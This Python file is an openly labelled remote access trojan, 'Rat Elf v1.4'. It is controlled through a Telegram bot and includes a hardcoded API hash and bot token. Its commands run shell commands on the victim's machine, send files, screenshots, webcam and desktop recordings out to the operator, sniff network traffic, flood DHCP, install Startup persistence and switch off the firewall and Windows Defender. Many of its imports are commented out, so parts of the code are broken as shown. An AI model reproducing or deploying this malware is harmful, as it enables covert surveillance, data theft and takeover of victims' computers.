import os
#os.system('python -m pip install  pyrogram==1.3.6 opencv-python==4.5.3.56 numpy==1.21.2 pywin32 playsound==1.3.0 gtts==2.2.4 pyautogui==0.9.53 psutil py-cpuinfo==8.0.0 scapy==2.4.5 regex==2022.1.18')
#Coded By : @e_l_f_6_6_6
#My Channel : @elf_security_cyber
"""
دابل کوتيشن هارو پر کنيد
يوزرنيمتون هم بزاريد
خودم اوپن کردم اصکي آزاد

"""
from pyrogram import *
#import gtts
from subprocess import *
import time
#import cv2
#import numpy as np
#import win32gui, win32con
from zipfile import ZipFile
#from playsound import playsound
#import webbrowser , sys
#import  ctypes
import psutil
from getpass import getuser
import platform
from datetime import datetime
#import cpuinfo
#import socket
#import uuid , sys
#import re , pyautogui
#from scapy.all import sniff
#from scapy.all import wrpcap
#from scapy.all import *

#def admin():
#    try:
#        return ctypes.windll.shell32.IsUserAnAdmin()
#    except:
#        return False
#if admin():
#    pass
#else:
#    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#    sys.exit()

#hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(hide , win32con.SW_HIDE)

"اینارو ست کنید!"
username = "e_l_f_6_6_6"           # <----
app = Client(
    session_name="elf",    # <---- 
    api_hash="9532637c4d95fbc047a14268cb493bbf",        # <----
    api_id="3191570",          # <----
    bot_token="5208662211:AAEouTBgQ5McNawVFFYYEc1Lf1dSJSapI8Y"        # <----
)   
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def dhcp(number):
    for i in range(number):
        dchp = Ether(
                        dst='ff:ff:ff:ff:ff:ff',src=RandMAC() , type=0x0800) / IP(src='0.0.0.0' , dst='255.255.255.255') / UDP(dport=67 , sport=68) / BOOTP(op=1,chaddr=RandMAC()) / DHCP(options=[('message-type' , 'discover') , ('end')])
        sendp(dchp,loop=0,verbose=1 )
     
@app.on_message(filters.user(users=username))
def Bot(client, message):
        T = message.text
        app.send_chat_action(message.chat.id , "typing")
        pwd = os.getcwd()
        if T == '/start':
            app.send_message(message.chat.id , 'Robot If Online..!' , reply_to_message_id=message.message_id)
            helps = '''
Rat Elf v1.4
➖➖➖➖➖➖➖➖➖➖➖
Commands..!   
💢➖➖➖➖➖➖➖➖➖➖💢
\n1)  /cmd [command] > Run Command In System Target
\n2)  /Download [Photo , Music , File] [Name File] > Downloaded File In System Target          
\n3)  /Record Desktop > Record Screen Desktop System Target
\n4)  /Record Webcam > Record WebCam  System Target
\n5)  /Shot > Screen Shot IN System Target
\n6)  /cd [pwd] > Change Pwd
\n7)  /Play:[text] > Play Text To system Target
\n8)  /Move Left [number] [number] > Mouse Moved Left
\n9)  /Move Right [number] [number] > Mouse Moved Right
\n10) /Click [number] [number] > Click Mouse 
\n11) /Drag [number] [number] > Drag In Mouse
\n12) /Scroll [number] > Scroll Mouse
\n13) /Type [text] > Type Your Text
\n14) /Run File [name file] > Open File In System
\n15) /Open Browser [Link or text] > Open Browser And Search Your Link Or Text
\n16) /Set StartUp > Set Rat In Start Up Windows
\n17) /Off Defend > Off FireWall And Windows Defender System
\n18) /Process > List Process System
\n19) /kill Process [name] > Killing Process In System
\n20) /Disk > Get Info Disk
\n21) /Info > Get Info System
\n22) /Sniff [count] > Sniffing Packet System (MITM)!
\n23) /Start-DHCP-Attack [number] > Send Packet In DHCP WIFI..!
🎃➖➖➖➖➖➖➖➖➖➖🎃
❗ Created By : @e_l_f_6_6_6
☣ My Channel : @elf_security_cyber

            '''
            app.send_message(message.chat.id , helps , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Sniff':
            pk = sniff(count=int(T.split(' ')[1]))
            try:
                os.remove('sniff.pcap')
            except:
                pass
            wrpcap('sniff.pcap', pk)
            app.send_document(message.chat.id, 'sniff.pcap' ,caption='File Data Sniffed..!')                    
        
        elif T.split(' ')[0] == '/Start-DHCP-Attack':
            dhcp(int(T.split(' ')[1]))


        elif T.split(' ')[0] == '/cmd':
            res = getoutput(T.split(' ')[1])
            app.send_message(message.chat.id , res , reply_to_message_id=message.message_id)
            
        elif T.split(' ')[0] == '/Off' and T.split(' ')[1] == 'Defend':
                os.system('powershell.exe -ExecutionPolicy RemoteSigned -file "off.ps1"')
                app.send_message(message.chat.id , f"The Firewall And Windows Defender Off.." , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Download' and T.split(' ')[1] == 'Photo':
            t = time.strftime('%H:%M:%S')

            app.send_photo(message.chat.id , str(T.split(' ')[2]) , caption=f"𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄..!\n𝐓𝐈𝐌𝐄 𝐈𝐓: {str(t)}" , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Download' and T.split(' ')[1] == 'Video':
            tm = time.strftime('%H:%M:%S')

            app.send_video(message.chat.id, str(T.split(' ')[2]),
                           caption=f"𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄..!\n𝐓𝐈𝐌𝐄 𝐈𝐓: {str(tm)}" , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Download' and T.split(' ')[1] == 'Music':
            tm = time.strftime('%H:%M:%S')

            app.send_audio(message.chat.id, str(T.split(' ')[2]),
                           caption=f"𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄..!\n𝐓𝐈𝐌𝐄 𝐈𝐓: {str(tm)}" , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Download' and T.split(' ')[1] == 'File':
            tm = time.strftime('%H:%M:%S')
            with ZipFile('file.zip', 'w') as zipObj2:
                zipObj2.write(T.split(' ')[2])

            app.send_document(message.chat.id, 'file.zip',
                           caption=f"𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄..!\n𝐓𝐈𝐌𝐄 𝐈𝐓: {str(tm)}"  , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/cd':
            os.chdir(str(T.split(' ')[1]))
            app.send_message(message.chat.id , f'𝗥𝗨𝗡𝗜𝗡𝗚 𝗧𝗢 {str(os.getcwd())}' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Set' and T.split(' ')[1] == 'StartUp':
            usernam = getuser()
            os.chdir(f"C:\\Users\\{usernam}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            file = open('Good-Bye.bat' , 'w+')
            file.write(f'start {pwd}\\Rat.py')
            file.close()
            app.send_message(message.chat.id , 'Set Rat In StartUp')
        elif T.split(' ')[0] == '/Process':
            name = ''
            for p in psutil.process_iter():
                name += p.name()+'\n'
            app.send_message(message.chat.id , f'List Process System Target \n{name}' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Kill' and T.split(' ')[1] == 'Process':
            for proc in psutil.process_iter():
                if str(proc.name()) == str(T.split(' ')[2]):
                        proc.kill()
                        app.send_message(message.chat.id , 'Process Killed..!' , reply_to_message_id=message.message_id)

        elif T == '/Shot':
            pwd = os.getcwd()
            os.chdir(pwd)
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save("New.png")
            tm = time.strftime('%H:%M:%S')
            size = pyautogui.size()
            app.send_photo(message.chat.id , 'New.png' , caption=f"{size}\n𝐘𝐎𝐔𝐑 𝐅𝐈𝐋𝐄..!\n𝐓𝐈𝐌𝐄 𝐈𝐓: {str(tm)}" , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Record' and T.split(' ')[1] == 'Desktop':
            screen = tuple(pyautogui.size())
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            fps = 12.0
            out = cv2.VideoWriter("output.avi", fourcc, fps, (screen))
            record_seconds = 10
            for i in range(int(record_seconds * fps)):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
            cv2.destroyAllWindows()
            out.release()
            t = time.strftime('%H:%M:%S')
 
            app.send_video(message.chat.id , f'output.avi' , caption=f'𝐅𝐈𝐋𝐄 𝐕𝐈𝐃𝐄𝐎 𝐍𝐄𝐖\n𝐓𝐈𝐌𝐄 𝐈𝐓:{str(t)}' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Record' and T.split(' ')[1] == 'Webcam':
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            output = cv2.VideoWriter("cam_video.mp4", vid_cod, 20.0, (640, 480))
            for i in range(int(T.split(' ')[2])):
                ret, frame = vid_capture.read()
                output.write(frame)
            vid_capture.release()
            output.release()
            cv2.destroyAllWindows()
            tm = time.strftime('%H:%M:%S')

            app.send_video(message.chat.id , 'cam_video.mp4' , caption=f'𝐅𝐈𝐋𝐄 𝐕𝐈𝐃𝐄𝐎 𝐍𝐄𝐖\n𝐓𝐈𝐌𝐄 𝐈𝐓:{str(tm)}'  , reply_to_message_id=message.message_id)

        elif T.split(':')[0] == '/Play':
            tts = gtts.gTTS(T.split(':')[1], lang='en')
            tts.save("File.mp3")
            playsound('File.mp3')
            app.send_message(message.chat.id ,f'Played Your Text..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Move' and T.split(' ')[1] == 'Left':
            pyautogui.moveTo(int(T.split(' ')[2]), int(T.split(' ')[3]) ,  duration = 1)
            app.send_message(message.chat.id , 'Mouse Moved Left..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Move' and T.split(' ')[1] == 'Right':
            pyautogui.moveRel(int(T.split(' ')[2]) , int(T.split(' ')[3])  , duration = 1)
            app.send_message(message.chat.id , 'Mouse Moved Right..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Click':
            pyautogui.click(int(T.split(' ')[1]), int(T.split(' ')[2])  , duration = 1)
            app.send_message(message.chat.id , 'Mouse Clicked..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Drag':
            pyautogui.dragRel(int(T.split(' ')[1]), int(T.split(' ')[2]) ,  duration = 1)
            app.send_message(message.chat.id , 'Mouse Dragged..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Scroll':
            pyautogui.scroll(int(T.split(' ')[1]))
            app.send_message(message.chat.id , 'Mouse Scrolled..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Type':
            pyautogui.typewrite(str(T.split(' ')[1:]))
            app.send_message(message.chat.id , 'Typed Your Text..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Run' and T.split(' ')[1] == 'File':
            os.startfile(T.split(' ')[2])
            app.send_message(message.chat.id , 'Running File..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Open' and T.split(' ')[1] == 'Browser':
            webbrowser.open(T.split(' ')[2])
            app.send_message(message.chat.id , 'Open Browser..!' , reply_to_message_id=message.message_id)

        elif T.split(' ')[0] == '/Info':
            uname = platform.uname()
            System = uname.system
            Node = uname.node
            Processor = cpuinfo.get_cpu_info()['brand_raw']
            MacAddress = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            Ip = socket.gethostbyname(socket.gethostname())
            boot_time_timestamp = psutil.boot_time()
            bt = datetime.fromtimestamp(boot_time_timestamp)
            bot = f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
            svmem = psutil.virtual_memory()
            total = get_size(svmem.total)
            use = get_size(svmem.used)
            Percentage = svmem.percent
            Availabl = get_size(svmem.available)
            app.send_message(message.chat.id,
             f'System : {System}\nNode : {Node}\nProcessor : {Processor}\nMac : {MacAddress}\nIp : {Ip}\nBoot Time : {bot}\n Total Memory : {total}\nUsed Memmory : {use}\nPercentage : {Percentage}\nAvailabl : {Availabl}'
                    , reply_to_message_id=message.message_id)
        
        elif T.split(' ')[0] == '/Disk':
            partitions = psutil.disk_partitions()
            for partition in partitions:
                name = f"Device : {partition.device}"
                Mountpoint = f"Mountpoint : {partition.mountpoint}"
                File_type = f"File system type : {partition.fstype}"
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                Total = f"Total Size : {get_size(partition_usage.total)}"
                uesd = f"Used : {get_size(partition_usage.used)}"
                free = f"Free : {get_size(partition_usage.free)}"
                Percentage = f"Percentage : {partition_usage.percent}"
                app.send_message(message.chat.id , f'{name}\n{Mountpoint}\n{File_type}\n{Total}\n{uesd}\n{free}\n{Percentage}', reply_to_message_id=message.message_id)


app.run()
